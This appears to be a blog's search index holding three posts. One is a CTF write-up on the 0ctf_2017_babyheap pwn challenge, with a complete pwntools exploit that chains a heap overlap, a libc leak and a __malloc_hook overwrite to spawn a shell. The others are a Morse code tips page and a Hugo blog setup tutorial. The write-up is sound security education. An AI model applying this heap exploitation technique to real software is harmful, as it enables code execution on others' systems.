ida查看伪C代码 典型菜单题，比较特殊的是，它使用了一个结构体数组，每个结构体内的content域中保存一个指向堆内存的指针\ninit_0函数 定义了一个整数变量 fd，一个字符指针变量 addr 以及一个无符号64位整型变量 v3。 使用 __readfsqword 指令从寄存器fs中读取 0x28 地址的值存入buf[3] 使用 setvbuf 函数将stdin和 _bss_start的缓存模式设置为2,即以行缓存的方式输入 使用alarm函数设置60秒超时 打印字符串 使用open打开/dev/urandom文件并赋值给fd 如果 fd \u0026lt; 0 或者 read(fd, buf, 0x10uLL) 返回值不为16,则终止程序 关闭文件 计算出一个地址addr,其值为(buf[9]. 然后计算一个变量v3. 使用mmap系统调用将addr开始的1k地址映射到内存，第三个参数为3，表示可读可写,第四个参数为34表示让系统自动选择内存地址，最后一个参数为0表示相对于起始地址，若映射不成功，退出程序。 返回 \u0026amp;addr[v3] 这段代码是在分配一个类似堆内存的内存区域，并返回这块内存的地址。通过使用/dev/urandom产生的随机数来进行内存地址的计算，来避免预测地址。\nmmap函数 mmap 是一个 C 库函数，用于在进程的虚拟地址空间中创建一段内存映射。\n该函数的原型为：\nvoid* mmap(void* addr, size_t length, int prot, int flags, int fd, off_t offset); 它有以下参数：\naddr：指定映射内存段的首地址。 length：指定映射内存段的大小。 prot：指定映射内存段的访问权限。 flags：指定映射内存段的其他特性。 fd：指定要映射的文件描述符。 offset：指定要映射的文件内存偏移量。 所以，mmap(addr, 0x1000uLL, 3, 34, -1, 0LL)的意思是：\n在进程的虚拟地址空间中创建一段大小为 0x1000 字节的内存映射。 这段内存映射的首地址为 addr。 这段内存映射的访问权限为可读写执行（即 3）。 这段内存映射的其他特性为共享内存（即 34）。 这段内存映射对应的文件描述符为 -1。 这段内存映射对应的文件内存偏移量为 0。 ✍️以上信息来源于chatgpt\n总之，它在防止我们拿到结构体的地址\nallocate 其中struc结构体为：\nchange 这个函数可以实现任意长度写，这样我们就可以修改任意chunk的size位\nremove free后置零，防止了UAF和double free\nshow 这里会打印出size个字符，不论是否是\\x00\n大致思路 利用任意长度写，实现chunk overlap后释放再分配，就得到了它所覆盖的chunk的随时可读权\n然后我们让它覆盖一个0x80的chunk，释放这个chunk后，我们就可以读到它fd指针内的main_arena地址，从而计算出libc基址\n然后我们再设计一个0x68大小的chunk，释放后用它上方的chunk的任意长度写更改其fd指针，这样我们就能实现fastbin attack，将其分配到__malloc_hook-0x23处（这是一个固定的漏洞地址），这样就可以绕过size位检查，更改__malloc_hook为one_gadget\n更多阅读：[BUUCTF]PWN——0ctf_2017_babyheap_Angel~Yan的博客-CSDN博客\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes from pymao import * pss: bool = False fn: str = \u0026#34;./0ctf_2017_babyheap\u0026#34; libc_name: str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;25886\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None, drop_bound: bool = True) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if drop_bound else p.recvuntil(bound) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) if drop_bound else p.recvuntil(bound) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) # sendline_after_clean(str(index)) sendline_after_clean(str(size)) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;4\u0026#34;) sendline_after_clean(str(index)) def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) send_after_clean(content) allocate(0x10) # 0 allocate(0x10) # 1 allocate(0x80) # 2 allocate(0x30) # 3 allocate(0x68) # 4 allocate(0x10) # 5 # gdb.attach(p) payload = flat({0x10:[ pg(0), pg(0xB1) ]}) change(0, payload) # gdb.attach(p) remove(1) # -1 payload = flat([ pg(0)*3, pg(0x91) ]) allocate(0xA0) # 1 change(1, payload) remove(2) # -2 # gdb.attach(p) show(1) p.recvuntil(\u0026#34;Content: \\n\u0026#34;) p.recv(0x20) libc_addr = recv_and_transform() -0x3c4b78 hook_addr = libc_addr + libc.sym[\u0026#39;__malloc_hook\u0026#39;] chunk_addr = hook_addr - 0x23 one_gadget = libc_addr + 0x4526a suclog( \u0026#34;libc_addr\u0026#34;, \u0026#34;hook_addr\u0026#34;, \u0026#34;chunk_addr\u0026#34;, \u0026#34;one_gadget\u0026#34;, ) payload = flat([ pg(0)*7, pg(0x71), pg(chunk_addr) ]) remove(4) # -4 change(3, payload) allocate(0x68) # 2 allocate(0x68) # 4 payload = flat({(0x13):[ one_gadget ]}) change(4, payload) # gdb.attach(p) allocate(0x100) interactive_after_clean() ","date":"2023年01月09日","permalink":"https://peterliuzhi.top/writeup/0ctf_2017_babyheap/","section":"writeup","summary":"The best preparation for tomorrow is doing your best today. — H. Jackson Brown Jr. 原题链接 checksec查看程序架构 ida查看伪C代码 典型菜单题，比较特殊的是，它使用了一个结构体数组，每个结构体内的c","tags":["pwn","chunk overlap","fastbin attack","main_arena leak"],"title":"0ctf_2017_babyheap"},{"categories":["tricks"],"contents":" Strong beliefs win strong men, and then make them stronger. — Richard Bach\n从音频到英文单词 Morse Code Adaptive Audio Decoder | Morse Code World这个网站可以解析莫斯电码音频\n或者使用DataBorder Morse Code Sound \u0026amp; Vibration Listener，可以设置阈限值，可以识别出下划线（但是表示为#）\n解析摩斯电码音频需要用到AI（非AI需要手工调试阈限值），网站能搞就用网站搞吧，方便点\n从英文单词到摩斯电码 morse_code_dict = { \u0026#39;a\u0026#39;: \u0026#39;.-\u0026#39;, \u0026#39;b\u0026#39;: \u0026#39;-...\u0026#39;, \u0026#39;c\u0026#39;: \u0026#39;-.-.\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;-..\u0026#39;, \u0026#39;e\u0026#39;: \u0026#39;.\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;..-.\u0026#39;, \u0026#39;g\u0026#39;: \u0026#39;--.\u0026#39;, \u0026#39;h\u0026#39;: \u0026#39;....\u0026#39;, \u0026#39;i\u0026#39;: \u0026#39;..\u0026#39;, \u0026#39;j\u0026#39;: \u0026#39;.---\u0026#39;, \u0026#39;k\u0026#39;: \u0026#39;-.-\u0026#39;, \u0026#39;l\u0026#39;: \u0026#39;.-..\u0026#39;, \u0026#39;m\u0026#39;: \u0026#39;--\u0026#39;, \u0026#39;n\u0026#39;: \u0026#39;-.\u0026#39;, \u0026#39;o\u0026#39;: \u0026#39;---\u0026#39;, \u0026#39;p\u0026#39;: \u0026#39;.--.\u0026#39;, \u0026#39;q\u0026#39;: \u0026#39;--.-\u0026#39;, \u0026#39;r\u0026#39;: \u0026#39;.-.\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;...\u0026#39;, \u0026#39;t\u0026#39;: \u0026#39;-\u0026#39;, \u0026#39;u\u0026#39;: \u0026#39;..-\u0026#39;, \u0026#39;v\u0026#39;: \u0026#39;...-\u0026#39;, \u0026#39;w\u0026#39;: \u0026#39;.--\u0026#39;, \u0026#39;x\u0026#39;: \u0026#39;-..-\u0026#39;, \u0026#39;y\u0026#39;: \u0026#39;-.--\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;--..\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;-----\u0026#39;, \u0026#39;1\u0026#39;: \u0026#39;.----\u0026#39;, \u0026#39;2\u0026#39;: \u0026#39;..---\u0026#39;, \u0026#39;3\u0026#39;: \u0026#39;...--\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;....-\u0026#39;, \u0026#39;5\u0026#39;: \u0026#39;.....\u0026#39;, \u0026#39;6\u0026#39;: \u0026#39;-....\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;--...\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;---..\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;----.\u0026#39;, \u0026#39; \u0026#39;: \u0026#39;/\u0026#39; } def encode_morse(latin_string): # 将拉丁文字符串转换为摩尔斯电码 morse_code = \u0026#39;\u0026#39; for char in latin_string: morse_code += morse_code_dict[char.lower()] + \u0026#39;/\u0026#39; return morse_code.strip() latin_string = \u0026#39;0 2 2 3 E P R I I B L Y H O N W A J M G H F G K C Q A O Q T M F R\u0026#39;.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) print(encode_morse(latin_string)) 也可以使用网站或者Best Morse Code Translator Online with Audio Play\n或者使用GitHub - HestStudio/MorseCoder: 一个关于摩斯密码解密与加密的库 / A library about encoding and decoding Morse code.\n相关阅读：\n利用python自动解析摩斯电码音频文件_Rabbit_Gray的博客-CSDN博客_如何从音频中提取摩斯密码 ","date":"2023年01月09日","permalink":"https://peterliuzhi.top/tricks/%E6%91%A9%E6%96%AF%E7%94%B5%E7%A0%81%E7%9A%84%E8%A7%A3%E7%A0%81/","section":"tricks","summary":"Strong beliefs win strong men, and then make them stronger. — Richard Bach 从音频到英文单词 Morse Code Adaptive Audio Decoder | Morse Code World这个网站可以解析莫斯电码音频 或者使用DataBorder Morse Code Sound \u0026amp; Vibration Listener","tags":["misc","morse"],"title":"摩斯电码的解码"},{"categories":["posts"],"contents":" Serious sport has nothing to do with fair play. It is bound up with hatred, jealousy, boastfulness, disregard of all rules and sadistic pleasure in witnessing violence. In other words, it is war minus the shooting. — George Orwell\n安装 hugo hugo 中文文档\n在releases 界面下载 hugo 的 exe 文件（windows可以使用choco安装），mac 用户可以使用brew install hugo\n如果要更新 hugo 的所有依赖库，使用命令go get -u -v github.com/gohugoio/hugo，注意，hugo 中文文档中给出的 GitHub 地址是已经过期的，运行后会叫你从这个地址下载（可以试试）\n使用 hugo 生成站点与文章，并在本地查看 使用命令hugo new site MyBlog生成一个博客文件夹\n使用命令hugo new posts\\intro.md，这个命令会在本来为空的 content 文件夹下新建 posts 文件夹，并在 posts 文件夹内新建 intro.md 文件。如果你不喜欢 posts 这个名字，也可以自定义。\n安装 hugo 主题，美化你的博客 hugo 有一个 themes 文件夹，使用cd themes进入该文件夹，在hugo 官方皮肤网站挑选一个喜欢的主题，使用 git 下载\n这里我使用的是wangchucheng提供的Eureka主题，页面简洁美观，有些功能很完善，但是有些功能没有，本教程会在后面说明增加方法\n请仔细阅读入门 - Hugo Eureka | WANG Chucheng下载安装该主题，本教程之后都是围绕该主题进行，如果你喜欢其他主题，可以查阅它的官方文档\n💡请阅读完主题文档再向下阅读，以下内容基本都是进阶内容\n使用 GitHub 的 pages 功能发布你的网页 这时候我们想看一下博客的效果，我们可以使用hugo -D server命令在本地查看。-D 选项默认在 public 文件夹生成页面，如果你想在 docs/文件夹生成页面，就使用hugo -d docs再hugo server\n这时候终端会蹦出一个类似//localhost:1313/的地址，在浏览器中输入该地址就能看到本地生成的博客啦\n如果想停止本地服务器就ctrl+c即可\n但是我们的博客不可能只给我们自己看啊，我们希望让互联网上的大家都看到。这时候我们有几个选择：\n购买自己的云服务器，价格比较昂贵，但是也有新人福利，能实现更多功能，酌情考虑 使用 GitHub 的 pages 服务，作者用的就是这个 使用 gitee 的 pages 服务，在国内会快一点，但是需要上传各种敏感信息，比如手持身份证照片，而且需要审核，酌情选择 注册 GitHub 账号 谷歌 GitHub 按指引注册即可\n创建一个新的仓库（repository） 仓库名最好是\u0026lt;你的用户名\u0026gt;.github.io，比如我就是 peterliu-all.github.io，如果不是这个名字可能会有一些未知的错误。\ndescription 随便写一下，一定要设置为 pubic，一开始先不要加别的文件（不要点下面的 add readme、license 等），让仓库为空\n然后复制一下仓库的 https 地址\n然后返回我们的终端，在你的博客根目录下输入hugo，这会忽略frontmatter标记draft: true，如果不想忽略草稿，就输入hugo -D\n然后我们进入 public 文件夹（或者你指定的生成页面的文件夹，比如 docs），输入下列命令：\ngit init \u0026lt;br\u0026gt; git remote add origin \u0026lt;你复制的github给的https链接\u0026gt; git add -A . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master 然后等一会（可以进入仓库-\u0026gt;action 查看进度）就进入我们的仓库-\u0026gt;settings-\u0026gt;pages 就可以看到我们的页面网址是https://\u0026lt;用户名\u0026gt;.github.io/啦\n在它build完前查看或者build完马上查看可能会出现无样式的情况\n自动build后上传脚本 将下面的命令保存为upload.ps1脚本（Windows 下的 powershell 使用）\n其中的python脚本见图片上传问题\n$others = $args[1..($args.Length - 1)] If ([String]::IsNullOrWhiteSpace($args[0])) { # 这是作者自定义的预处理文章的python脚本 python dispose_image.py false } else { python dispose_image.py $args[0] } hugo -v --log cd public git add -A . If ([String]::IsNullOrWhiteSpace(\u0026#34;$others\u0026#34;)){ git commit -m \u0026#34;$(date)\u0026#34; } else { git commit -m \u0026#34;$others\u0026#34; } git push origin master cd .. 其中第一个命令行参数会传递给python脚本，值为true或false，具体见图片上传问题\n第二个参数就是git commit的更新信息\n以后就可以使用.\\upload.ps1 false \u0026quot;\u0026lt;更新message\u0026gt;\u0026quot;来上传啦\n其他平台可以使用upload.py：\nimport os import sys import time if len(sys.argv) \u0026lt; 2: os.system(\u0026#34;python dispose_image.py false\u0026#34;) else: os.system(f\u0026#34;python dispose_image.py {sys.argv[1]}\u0026#34;) os.system(\u0026#34;hugo -v --log\u0026#34;) os.chdir(\u0026#34;public\u0026#34;) os.system(\u0026#34;git add -A .\u0026#34;) if len(sys.argv) \u0026lt;= 2: os.system(f\u0026#39;git commit -m \u0026#34;{time.strftime(\u0026#34;%Y-%m-%dT%H:%M:%S+08:00\u0026#34;, time.localtime())}\u0026#34;\u0026#39;) else: os.system(f\u0026#39;git commit -m \u0026#34;{sys.argv[2:]}\u0026#34;\u0026#39;) os.system(\u0026#34;git push origin master\u0026#34;) 本地渲染我也写了一个脚本，名为.\\local.ps1：\nIf ([String]::IsNullOrWhiteSpace($args[0])) { python dispose_image.py false } else { python dispose_image.py $args[0] } hugo -v --log hugo server --disableFastRender 使用方法是.\\local.ps1或.\\local.ps1 true来进行本地渲染了\n其他平台可以使用local.py：\nimport os import sys if len(sys.argv) \u0026lt; 2: os.system(\u0026#34;python dispose_image.py false\u0026#34;) else: os.system(f\u0026#34;python dispose_image.py {sys.argv[1]}\u0026#34;) os.system(\u0026#34;hugo -v --log\u0026#34;) try: os.system(\u0026#34;hugo server --disableFastRender\u0026#34;) except KeyboardInterrupt: print(\u0026#34;已退出\u0026#34;) except Exception as e: print(f\u0026#34;出现错误：{e}\u0026#34;) 图片上传问题 我们可以购买阿里云等服务供应商的图床服务（OSS服务），也可以使用GitHub保存图片\nEureka主题提供了一系列的上传图片的方法，详情见文档\n现在只需要知道两点：\n图片可以保存在/assets/images中，调用图片的时候markdown语法类似于![](/images/example.png) 图片可以保存在/content/image中，调用图片的时候markdown语法类似于![](/image/example.png) 总之存放图片/附件的文件夹在build的时候会被移动到根目录\n因此我们可以根据这点使用obsidian进行无缝衔接\n我们将仓库设在content文件夹，设置粘贴图片时的链接为相对仓库根目录的绝对路径：\n这样粘贴example.png的时候生成的图片链接就是![](/image/example.png)，但是如果image前没有\u0026quot;/\u0026quot;，那么这个链接会被浏览器识别为相对链接，不会指向根目录下的image文件夹，如果手动更改为![](/image/example.png)，会发现obsidian和浏览器都能正确找到图片并展示，那么该怎么自动化实现这点呢？\n作者的方案是使用一个python脚本自动解析并替换所有的图片链接和附件链接，将下列代码保存为dispose_image.py并对上面给的代码中的python dispose_image.py取消注释\nimport re import os import sys from os.path import * redispose = False redispose = True if sys.argv[-1] == \u0026#34;true\u0026#34; else False # 忽略的文件夹和文件名字，注意，只能识别路径中最后一个名字 ignore = [\u0026#34;image\u0026#34;, \u0026#34;model\u0026#34;, \u0026#34;archive\u0026#34;, \u0026#34;stats\u0026#34;, \u0026#34;search.md\u0026#34;, \u0026#34;Excalidraw\u0026#34;, \u0026#34;draw.io\u0026#34;, \u0026#34;appendix\u0026#34; \u0026#34;Chromium OS Docs - Linux System Call Table\u0026#34;, \u0026#34;subscribe\u0026#34;] # image: True表示image文件夹是一个保存图片的文件夹，False表示保存附件 check_folder = {\u0026#34;image\u0026#34;: True, \u0026#34;appendix\u0026#34;: False} all_pat = {folder:re.compile(f\u0026#34;!\\[(.*)\\]\\({folder}(.*)\\)\u0026#34;) if jud else re.compile(f\u0026#34;\\[(.*)\\]\\({folder}(.*)\\)\u0026#34;) for folder, jud in check_folder.items()} # D:\\database_BooksAndFiles\\Blog\\fnlblog\\test\\test.md # 递归地处理文件夹下的内容，包括子文件夹的内容 def dispose(folder: str): global ignore dirs = os.listdir(folder) for file in dirs: if not (file.startswith(\u0026#34;.\u0026#34;) or file in ignore): print(f\u0026#34;[+]{file}\u0026#34;) fullpath = join(abspath(folder), file) if isfile(fullpath) and splitext(file)[1].strip(\u0026#34; \\n\u0026#34;) == \u0026#34;.md\u0026#34;: lines = [] flag = True start = 0 font_matter: int = 0 with open(fullpath, \u0026#34;r\u0026#34;, encoding=\u0026#34;UTF-8\u0026#34;) as f: for i, line in enumerate(f.readlines()): if line.strip(\u0026#34;\\n\u0026#34;).strip() == \u0026#34;---\u0026#34;: if font_matter == 0: font_matter = 1 start = i elif font_matter == 1: font_matter = 2 elif font_matter == 1 and not redispose: opt = line.split(\u0026#34;:\u0026#34;) if opt[0].strip() == \u0026#34;dispose\u0026#34; and \u0026#34;true\u0026#34; in opt[1]: # 如果frontmatter中存在dispose: true，那么就不处理该文件 flag = False print(\u0026#34;dispose=True，已经过处理\u0026#34;) break elif font_matter == 2: for fd, pat in all_pat.items(): for match in pat.finditer(line): line = pat.sub( f\u0026#34;![{match.group(1)}](/{fd}{match.group(2)})\u0026#34;, line) \\ if check_folder[fd] == True \\ else f\u0026#34;[{match.group(1)}](/{fd}{match.group(2)})\u0026#34; print(line, end= \u0026#34;\u0026#34; if line.endswith(\u0026#34;\\n\u0026#34;) else \u0026#34;\\n\u0026#34;) lines.append(line) if flag and len(lines) \u0026gt; 0: with open(fullpath, \u0026#34;w\u0026#34;, encoding=\u0026#34;UTF-8\u0026#34;) as f: f.writelines(lines[:start+1]) if not redispose: # 处理过的文件会在frontmatter中加上dispose: true f.write(\u0026#34;dispose: true\\n\u0026#34;) f.writelines(lines[start+1:]) elif isdir(fullpath): dispose(join(folder, file)) dispose(\u0026#34;content\u0026#34;) 这个脚本会解析它的命令行参数，如果传入sys.argv[1] == \u0026quot;true\u0026quot;，那么它就不会管frontmatter中dispose: true项，一视同仁地对所有文件进行解析，但这可能会浪费时间，所以建议传入false或者什么都不传入，这样程序会不解析frontmatter中有dispose: true项的文件\nfontawesome小插图无法显示的问题 hugo中很多时候都会用到fontswesome的小插图，但是Eureka中好像有bug无法显示\n解决方法就是注册一下fontswesome并点击获取kit code代替/themes/eureka/layouts/partials/head.html中原本的链接：\n使用 disqus 添加评论功能 Eureka中实现这点非常简单，你只需要注册disqus并获取shortname，填在params.yaml中就行： 相关阅读：\n给Hugo添加disqus评论服务 | Marvin\u0026rsquo;s Blog【程式人生】\n在代码旁增加复制按钮 在根目录 /static/css/ 和 /static/js/ 分别创建 copy-btn.css 和 copy-btn.js，分别写入：\n.highlight { position: relative; } .highlight td:first-child { user-select: none; } .highlight pre { padding-right: 75px; /* background-color: #f8f8f8 !important; */ } .highlight-copy-btn { position: absolute; top: 7px; right: 7px; border: 0; border-radius: 4px; padding: 1px; font-size: 0.8em; line-height: 1.8; /* color: #fff; background-color: #777; */ min-width: 55px; text-align: center; transition: 0.1s; opacity: 0.8; } .highlight-copy-btn:hover { opacity: 1; filter: drop-shadow(16px 16px 20px rgba(163, 163, 163, 0.178)); } // add-copy-btn.js (function () { \u0026#34;use strict\u0026#34;; if (!document.queryCommandSupported(\u0026#34;copy\u0026#34;)) { return; } function flashCopyMessage(el, msg) { el.textContent = msg; setTimeout(function () { el.textContent = \u0026#34;Copy\u0026#34;; }, 1000); } function selectText(node) { var selection = window.getSelection(); var range = document.createRange(); range.selectNodeContents(node); selection.removeAllRanges(); selection.addRange(range); return selection; } function addCopyButton(containerEl) { var copyBtn = document.createElement(\u0026#34;button\u0026#34;); copyBtn.className = \u0026#34;highlight-copy-btn\u0026#34;; copyBtn.textContent = \u0026#34;Copy\u0026#34;; var codeEl = containerEl.firstElementChild; copyBtn.addEventListener(\u0026#34;click\u0026#34;, function () { try { var selection = selectText(codeEl); navigator.clipboard.writeText(selection); selection.removeAllRanges(); flashCopyMessage(copyBtn, \u0026#34;Copied!\u0026#34;); } catch (e) { console \u0026amp;\u0026amp; console.log(e); flashCopyMessage(copyBtn, \u0026#34;Failed :(\u0026#34;); } }); containerEl.appendChild(copyBtn); } // Add copy button to code blocks var highlightBlocks = document.getElementsByClassName(\u0026#34;highlight\u0026#34;); Array.prototype.forEach.call(highlightBlocks, addCopyButton); })(); 然后在/themes/eureka/layouts/partials/footer.html末尾加上：\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{{.Site.BaseURL}}css/copy-btn.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/copy-btn.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 需要注意的是，Eureka主题还需更改config.yaml文件中markup-\u0026gt;highlight：\nmarkup: # Do not modify markup.highlight highlight: codeFences: true noClasses: false guessSyntax : true lineNoStart : 1 tabWidth : 4 anchorLineNos : true lineAnchors : \u0026#39;\u0026#39; noHl : false 可能需要更改themes/eureka/assets/css/highlightjs.css为：\n/* hljs.js */ .hljs { background-color: transparent !important; color: var(--color-tertiary-text) !important; padding: 0 !important; position: relative; } 效果如图：\n在文章列表中显示tag 覆盖themes/eureka/layouts/partials/components/post-metadata.html为：\n\u0026lt;div class=\u0026#34;text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center\u0026#34; \u0026gt; \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span \u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-clock me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ i18n \u0026#34;readingTime\u0026#34; .ReadingTime }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; {{ with .GetTerms \u0026#34;categories\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-folder me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} {{ with .GetTerms \u0026#34;tags\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-tag\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} {{ with .GetTerms \u0026#34;series\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-th-list me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; 在文章开头显示字数 Eureka默认只显示阅读用时，这有时候非常蛋疼，因为机器的阅读用时和我们人差距很大，没法直观地体现出文章有多长\n我们可以在themes/eureka/layouts/partials/components/post-metadata.html中阅读用时那个div前面增加：\n\u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-file-pen\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;本文共{{ plainify .WordCount }}字\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 